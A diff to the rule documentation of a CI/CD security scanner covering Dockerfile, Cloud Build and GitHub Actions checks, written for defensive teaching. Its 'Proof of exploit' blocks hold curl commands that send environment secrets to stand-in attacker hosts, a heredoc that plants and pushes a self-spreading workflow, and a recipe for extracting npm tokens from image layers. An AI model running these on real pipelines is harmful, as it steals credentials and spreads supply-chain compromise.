+**Recommendation.** Pass ``--ignore-scripts`` to every ``npm`` / ``npm ci`` / ``pnpm install`` / ``yarn install`` invocation in the Dockerfile, or set ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` / ``ENV YARN_ENABLE_SCRIPTS=false`` before the install line. Lifecycle scripts (``preinstall``, ``install``, ``postinstall``, ``prepare``) are the blast radius of the Shai-Hulud / TanStack / axios incidents, a single compromised dependency in the transitive tree runs arbitrary code with the build container's credentials. ``--ignore-scripts`` removes that primitive without affecting lockfile resolution; the few legitimate consumers (``node-gyp``-based native modules) should be allow-listed via a follow-up ``npm rebuild <pkg> --ignore-scripts=false`` line scoped to the specific package.
+
+**Known false positives.**
+
+- Images that build native modules via ``node-gyp`` need the lifecycle scripts to compile bindings (``better-sqlite3``, ``sharp``, ``canvas``, ...). The fix is per-package: keep the top-level install on ``--ignore-scripts``, then ``RUN npm rebuild better-sqlite3`` afterward, scoped to the audited package. Suppress with a one-line rationale only when an engineer has confirmed every script-running dep is first-party or pinned to a hash.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): postinstall scripts in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. ``--ignore-scripts`` neutralizes the postinstall primitive at install time.
+- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Lockfile pinning did not help (the pinned tag itself was poisoned); ``--ignore-scripts`` would have stopped execution.
+
+**Proof of exploit.**
+
+# Vulnerable: postinstall in a transitive dep runs with the
+# builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
+FROM node:20@sha256:<digest>
+COPY package.json package-lock.json ./
+RUN npm ci          # <-- runs postinstall of every dep
+
+# Attack: the compromised package's package.json carries:
+#   "scripts": { "postinstall": "node ./harvest.js" }
+# harvest.js reads ~/.npmrc, process.env, ~/.aws/credentials
+# and POSTs them to a webhook. The image is also tampered:
+# the script writes a second-stage loader into node_modules
+# that runs at every container start.
+
+# Safe: scripts disabled at install time; rebuild only the
+# audited native-module set afterward.
+FROM node:20@sha256:<digest>
+ENV NPM_CONFIG_IGNORE_SCRIPTS=true
+COPY package.json package-lock.json ./
+RUN npm ci --ignore-scripts
+RUN npm rebuild better-sqlite3 sharp    # audited allowlist
+
+**Source:** [`DF-024`](../providers/dockerfile.md#df-024) in the [Dockerfile provider](../providers/dockerfile.md).
+
+#### `DF-025`: RUN writes a registry auth token into a Docker layer <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-025 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-6`](#ctrl-cicd-sec-6) Insufficient Credential Hygiene.
+
+**How this is detected.** Fires when a ``RUN`` body writes a recognized registry-auth token line into a file via ``echo`` / ``printf`` / heredoc. Patterns matched: ``//registry.npmjs.org/:_authToken=`` (and any ``//host/:_authToken=`` shape), ``//host/:_password=``, ``//host/:_auth=`` (npm legacy basic auth), and the pip equivalents ``index-url = https://<user>:<pass>@host`` and ``extra-index-url = https://<user>:<pass>@host``. Token value may be a literal or a ``$VAR`` / ``${VAR}`` interpolation, both end up in the layer once the build args / env are substituted. Complements DF-019 (``COPY`` of a ``.npmrc`` from the build context); DF-025 catches the in-layer write that DF-019 can't see.
+
+**Recommendation.** Don't bake registry tokens into layers. Use BuildKit secret mounts: ``RUN --mount=type=secret,id=npm,target=/root/.npmrc npm ci`` (the file is mounted only for the duration of the step and never lands in the image). For pip, mount a ``pip.conf`` the same way, or use ``--mount=type=secret`` to expose ``PIP_INDEX_URL`` containing the credentials. A secret written into a layer is recoverable from the image with ``docker save`` + ``tar``, even if a later ``RUN`` deletes the file.
+
+**Known false positives.**
+
+- An interpolation that references an env var the Dockerfile intentionally leaves unset at build time (placeholder line for a templated install script) still triggers the rule; the regex can't reason about whether ``$NPM_TOKEN`` resolves to anything. Either remove the line entirely or move to a ``--mount=type=secret`` flow.
+
+**Seen in the wild.**
+
+- Numerous public Docker Hub leaks of ``_authToken=`` lines in image layers (search ``//registry.npmjs.org/:_authToken`` on public registries). The same lateral-movement primitive the Shai-Hulud worm relies on: any stolen NPM token reaches the victim's publish-scope packages on the next ``npm publish``.
+
+**Proof of exploit.**
+
+# Vulnerable: token interpolated from a build ARG and written
+# into a layer. The arg value is recoverable by anyone with
+# image pull access (and from public image scans).
+FROM node:20@sha256:<digest>
+ARG NPM_TOKEN
+RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" \
+    > /root/.npmrc \
+    && npm ci
+
+# Attack: docker save image | tar xO --wildcards '*.npmrc'
+# yields the literal token. The attacker then publishes a
+# new patch version of one of the org's packages with a
+# postinstall stealer (Shai-Hulud shape).
+
+# Safe: BuildKit secret mount. The .npmrc is mounted into
+# the step's filesystem, used by npm ci, then unmounted; the
+# layer carries no trace of the token.
+FROM node:20@sha256:<digest>
+RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
+    npm ci --ignore-scripts
+
+**Source:** [`DF-025`](../providers/dockerfile.md#df-025) in the [Dockerfile provider](../providers/dockerfile.md).
 
 #### `DR-001`: Step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-001 }
 
@@ -3198,6 +3849,10 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.
 
+**Known false positives.**
+
+- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.
+
 **Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }
@@ -3207,6 +3862,10 @@ Detection is value-only and case-sensitive against the documented variable names
 **How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.
 
 **Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.
+
+**Known false positives.**
+
+- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.
 
 **Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -3374,6 +4033,10 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Pass user substitutions through ``env:`` (or ``secretEnv:`` for sensitive values) and reference them inside a checked-in shell script rather than splicing them directly into ``args``. If the step truly needs to invoke shell logic inline, switch the entrypoint to the underlying tool (``docker``, ``gcloud``, ``gsutil``) and let the tool see the substitution as an argument, not as shell text.
 
+**Known false positives.**
+
+- Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.
+
 **Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }
@@ -3430,6 +4093,10 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Add an entry for every ``$_USER_VAR`` referenced anywhere in the build to the top-level ``substitutions:`` block, either with a sensible default or with an empty string if the trigger always supplies the value. Cloud Build's default ``options.substitutionOption: MUST_MATCH`` then fails the build at parse time on undeclared references (catching typos at the gate). With the looser ``ALLOW_LOOSE`` opt-in (GCB-022) undeclared references silently expand to the empty string, which masks the bug and quietly broadens any shell command that interpolates the value.
 
+**Known false positives.**
+
+- Cloud Build deployments triggered exclusively via ``gcloud builds submit --substitutions=_FOO=bar`` (without a build trigger) may legitimately reference ``$_FOO`` without declaring it under ``substitutions:`` because the value is always supplied from the CLI. The scanner can't observe trigger / CLI configuration, only the YAML. Declaring the variable with an empty-string default is the canonical fix; ``--ignore-file`` is the escape hatch when that's not practical.
+
 **Source:** [`GCB-023`](../providers/cloudbuild.md#gcb-023) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-024`: Build pushes Docker images but top-level images: is empty <span class="pg-sev pg-sev--low">LOW</span> { #detail-gcb-024 }
@@ -3472,7 +4139,7 @@ Detection is value-only and case-sensitive against the documented variable names
 
 #### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.
 
@@ -3517,7 +4184,7 @@ Detection is value-only and case-sensitive against the documented variable names
 **Seen in the wild.**
 
 - GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
-- Trail of Bits ``Codecov-style supply chain via pwn requests`` (2021): showed the primitive against widely-used Actions workflows. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
+- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
 
 **Proof of exploit.**
 
@@ -3587,7 +4254,7 @@ jobs:
 **Seen in the wild.**
 
 - [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
-- Trail of Bits ``pwn-request`` research (2021): demonstrated the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR could exfiltrate every secret the workflow could see. Mitigation is the same: never interpolate context into shell, route through ``env:``.
+- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.
 
 **Proof of exploit.**
 
@@ -3674,7 +4341,7 @@ jobs:
 
 **Evidences:** [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.
 
@@ -3770,7 +4437,7 @@ steps:
 
 **Evidences:** [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
 
-**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognises all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.
+**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognizes all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.
 
 **Recommendation.** Configure the self-hosted runner to register with `--ephemeral` (the runner exits after one job and is freshly registered), and add an `ephemeral` label so this check can verify it. Consider actions-runner-controller for ephemeral pools.
 
@@ -3787,6 +4454,10 @@ steps:
 **How this is detected.** `on: issue_comment` (and `discussion_comment`) fires for every comment on every issue or discussion in the repository. On public repos this means any GitHub user can trigger workflow execution. If the workflow runs commands, deploys, or accesses secrets, the attacker controls timing and can inject payloads through the comment body.
 
 **Recommendation.** Add an `if:` condition that checks `github.event.comment.author_association` (e.g. `contains('OWNER MEMBER COLLABORATOR', ...)`), `github.event.sender.login`, or `github.actor` against an allowlist. Without a guard, any GitHub user can trigger the workflow by posting a comment.
+
+**Known false positives.**
+
+- Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.
 
 **Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).
 
@@ -3835,7 +4506,7 @@ steps:
 **Seen in the wild.**
 
 - [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
-- Bitwarden / npm install scripts (CVE-2018-7536-class incidents): remote-script execution in CI is the same primitive. The attacker controls bytes the runner executes. Pinning a digest or hosting a vendored copy turns a perpetual ambient risk into a one-time review.
+- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.
 
 **Proof of exploit.**
 
@@ -3945,7 +4616,7 @@ jobs:
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -4003,7 +4674,7 @@ jobs:
 
 #### `GHA-025`: Reusable workflow not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-025 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.
 
@@ -4087,6 +4758,10 @@ jobs:
 **How this is detected.** GHA-010 flags ``uses: ./action``, the *action* form of the same threat. This rule extends to direct shell invocation: ``run: ./scripts/setup.sh`` / ``run: bash scripts/setup.sh`` / ``run: python tools/build.py`` resolve against the checked-out workspace, which on ``pull_request_target`` / ``workflow_run`` is PR-controlled. The attacker ships an edited script and gets a default-branch-privileged shell.
 
 **Recommendation.** Either don't run the script under an untrusted trigger, or split the workflow: keep the privileged work on the default branch (``push`` / ``release`` triggers, no PR fork content), and run untrusted-trigger steps in a separate workflow with no secrets and a minimal ``GITHUB_TOKEN`` scope. Pinning the script via ``uses: org/repo@<sha>`` from a separate trusted repo is the canonical fix.
+
+**Known false positives.**
+
+- Workflows that explicitly checkout a *trusted* ref (``ref: ${{ github.event.pull_request.base.sha }}`` or the default branch) before invoking the local script land the trusted bytes on disk, so the script body the PR ships is never executed. The rule has no checkout-graph analysis, it fires on any ``run: ./script`` under an untrusted trigger. Suppress per-workflow via ``--ignore-file`` once you've verified the checkout ref is anchored to a base-branch SHA; the safer pattern is still to split the workflow so secrets aren't in scope during the build half.
 
 **Source:** [`GHA-032`](../providers/github.md#gha-032) in the [GitHub Actions provider](../providers/github.md).
 
@@ -4198,7 +4873,7 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 
 #### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.
 
@@ -4216,30 +4891,33 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 **Proof of exploit.**
 
 # Vulnerable: pinned to a SHA the attacker landed under @v45.
-- uses: tj-actions/changed-files@0e58ed867288cdc3d92e6e2f9bb9b1bd0c4c78d2
+# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
+# advisory; the registry in _compromised_actions.py carries it.)
+- uses: tj-actions/changed-files@<advisory-malicious-sha>
 
 # Same applies to tag pins that resolved to the malicious
 # commit during the compromise window:
 - uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit
 
-# Attack: the action body exfiltrated CI secrets to a
-# Memdump-style endpoint:
+# Attack: the injected action body exfiltrated CI secrets by
+# dumping the runner process environment to a controlled host:
 #   curl -X POST https://attacker.example/exfil \
 #     -d "$(cat /proc/self/environ)"
 #
 # Every workflow run that hit one of those refs over the
-# ~24-hour exposure window leaked the entire env block,
-# including ${{ secrets.* }} and GITHUB_TOKEN.
+# compromise window leaked the entire env block, including
+# ${{ secrets.* }} and GITHUB_TOKEN.
 
 # Safe: pin to the post-incident clean SHA the maintainer
-# published in the advisory:
-- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0 (clean)
+# republished in the advisory (consult the GHSA the registry
+# cites for the exact value):
+- uses: tj-actions/changed-files@<advisory-clean-sha>
 
 **Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).
 
 #### `GHA-041`: Action upstream repo has a single contributor <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-041 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Reads the contributor count from ``ctx.action_metadata[owner/repo].contributor_count`` (populated by the ``--resolve-remote`` path; the GitHub REST ``/contributors`` endpoint, capped at two entries — the rule only cares about == 1). When the fetch failed or the flag is off, the rule passes silently. Forks and archived repos that ALSO have a single contributor fire the rule; the fork / archived state is part of the same supply-chain risk story.
 
@@ -4257,7 +4935,7 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 
 #### `GHA-042`: Action upstream repo is newly created <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-042 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Reads ``created_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path). Fires when the repo's age in days is below ``MIN_AGE_DAYS`` (90). Without the opt-in flag the rule passes silently with a nudge.
 
@@ -4275,7 +4953,7 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 
 #### `GHA-043`: Low-star action runs with sensitive permissions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-043 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-5`](#ctrl-cicd-sec-5) Insufficient PBAC.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-5`](#ctrl-cicd-sec-5) Insufficient PBAC, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Reads ``stargazers_count`` from ``ctx.action_metadata[owner/repo]`` and the effective ``permissions:`` block (job-level wins; falls back to workflow-top-level; falls back to the caller's inherited block for resolved reusable workflows). Fires when stars < ``MAX_STARS`` (25) AND any of 'contents', 'packages', 'id-token', 'actions', 'deployments' is set to ``write`` on the calling job. ``permissions: write-all`` is treated as all scopes set to write.
 
@@ -4417,6 +5095,10 @@ jobs:
 
 **Recommendation.** Don't materialize the PR head in a ``pull_request_target`` or ``workflow_run`` job. If you need to inspect PR content, split the workflow: a privileged half (with secrets) that uses metadata only (PR number, base ref, label) and an unprivileged ``pull_request`` half that builds the code with no secrets in scope.
 
+**Known false positives.**
+
+- Workflows that fetch the PR head purely to *inspect metadata* (``git fetch origin pull/N/head && git log -1 FETCH_HEAD --format=%s``) and never run code from the fetched tree still trigger the rule, because the fetch primitive is the structural signal. The rule has no way to confirm the workspace bytes are never executed. Suppress per-workflow via ``--ignore-file`` once you've verified no ``run:`` / ``uses: ./`` step consumes the checked-out tree; the safer pattern is still to read PR metadata via the GitHub API rather than materializing the head ref.
+
 **Seen in the wild.**
 
 - GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020) listed manual ``git fetch pull/<N>/head`` as one of the equivalent ways teams shoot themselves in the foot. Auditors checking only ``actions/checkout`` miss the shell-level variants entirely.
@@ -4471,9 +5153,184 @@ jobs:
 
 **Seen in the wild.**
 
-- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2024) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.
+- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.
 
 **Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).
+
+#### `GHA-048`: Workflow step writes a file under .github/workflows/ <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-048 }
+
+**Evidences:** [`CICD-SEC-1`](#ctrl-cicd-sec-1) Insufficient Flow Control Mechanisms, [`CICD-SEC-4`](#ctrl-cicd-sec-4) Poisoned Pipeline Execution.
+
+**How this is detected.** Fires when a ``run:`` body writes a file path containing ``.github/workflows/`` via shell redirect (``>``, ``>>``), ``tee``, ``cp`` / ``mv``, heredoc, ``cat <<EOF >``, or a templating tool (``envsubst``, ``yq -i``, ``sed -i``). The rule also fires on a ``uses:`` of a third-party action whose documented behavior is workflow file generation (anything matching ``stefanzweifel/git-auto-commit`` paired with a ``.github/workflows`` argument). The single Shai-Hulud worm (2026) propagated via this exact pattern: a postinstall script wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen ``GITHUB_TOKEN`` could push to.
+
+Distinct from GHA-019 (token-to-file persistence) and GHA-049 (cross-repo push): GHA-048 catches the *content* (a workflow file is written somewhere on the runner), GHA-049 catches the *push* (the runner's git remote is a repo other than the one under test).
+
+**Recommendation.** Remove the step that writes into ``.github/workflows/``. A workflow that authors a sibling workflow is the canonical worm-propagation primitive: the new file runs on the next matching trigger with the repo's GITHUB_TOKEN. There is no legitimate non-automation reason for an in-CI step to write workflow YAML; bot-style automation (release-please, Renovate) should be moved to an external account whose token is scoped, audited, and not the runner's ``GITHUB_TOKEN``. If the write is a templated scaffold (``cookiecutter`` for a new repo), do it in a separate, environment-gated job and ensure the target is never the same repo's workflows dir.
+
+**Known false positives.**
+
+- Workflow-bootstrap repos (``cookiecutter-gh-action``, internal scaffolding for new microservices) legitimately scaffold ``.github/workflows/`` files. The right scope is a single, well-named step in an environment-gated job; suppress on that specific step with a rationale that names the destination repo and the gating environment.
+- Bot accounts that legitimately republish workflow files (``release-please-action`` updating its own manifest) are narrow allow-list candidates rather than blanket suppression targets.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): the malicious postinstall script in compromised packages used the runner's GITHUB_TOKEN to push ``.github/workflows/shai-hulud-workflow.yml`` into the victim's repos. On the next push trigger the worm ran with fresh token scope, repeating the propagation step against every repo the token could reach.
+
+**Proof of exploit.**
+
+# Vulnerable: a build step writes a sibling workflow file.
+# After the next push to the default branch, the new
+# workflow runs with the repo's permissions and propagates.
+jobs:
+  build:
+    permissions: { contents: write }
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: npm ci
+      - run: |
+          # postinstall-driven worm pattern:
+          cat > .github/workflows/shai-hulud.yml <<'EOF'
+          name: shai-hulud
+          on: push
+          jobs:
+            spread:
+              runs-on: ubuntu-latest
+              steps:
+                - run: curl -d @<(env) https://attacker/exfil
+          EOF
+          git add .github/workflows/shai-hulud.yml
+          git commit -m 'ci: add lint workflow'
+          git push
+
+# Safe: never author workflow YAML from inside another
+# workflow. Scaffold via an external bootstrapping job
+# that runs outside the runner's GITHUB_TOKEN scope.
+
+**Source:** [`GHA-048`](../providers/github.md#gha-048) in the [GitHub Actions provider](../providers/github.md).
+
+#### `GHA-049`: Workflow step pushes to a repo outside the current owner <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-049 }
+
+**Evidences:** [`CICD-SEC-1`](#ctrl-cicd-sec-1) Insufficient Flow Control Mechanisms, [`CICD-SEC-4`](#ctrl-cicd-sec-4) Poisoned Pipeline Execution.
+
+**How this is detected.** Three shapes are detected in ``run:`` bodies:
+
+1. ``git push`` to a remote whose URL is interpolated from an expression (``${{ ... }}``), an env var (``$VAR``), or is not the canonical ``origin`` / ``upstream``;
+2. ``gh repo create`` / ``gh repo edit`` / ``gh repo transfer`` / ``gh api /repos/...`` whose target owner is parameterized;
+3. ``gh release create`` / ``gh release upload`` against a repo specified via ``-R <owner>/<repo>`` where the value is parameterized rather than a literal allow-list entry.
+
+Pairs with GHA-048 (self-mutation, which catches the *write* into ``.github/workflows/`` of a sibling workflow): GHA-049 catches the *push* primitive that lets a worm leave the current repo. Together they cover both halves of the Shai-Hulud propagation step.
+
+**Recommendation.** Don't push from CI to a repository whose owner is supplied by an unvetted source (an env var, a workflow input, an interpolated PR field, or a step output). Cross-repo writes from CI are the second leg of the Shai-Hulud propagation loop, the worm uses the runner's GITHUB_TOKEN (or a stolen PAT) to ``git push`` or ``gh repo create`` against every repo the token can reach. If the workflow truly needs to push to an external repo, bind the step to a protected ``environment:`` and pin the destination to a literal ``owner/repo`` string.
+
+**Known false positives.**
+
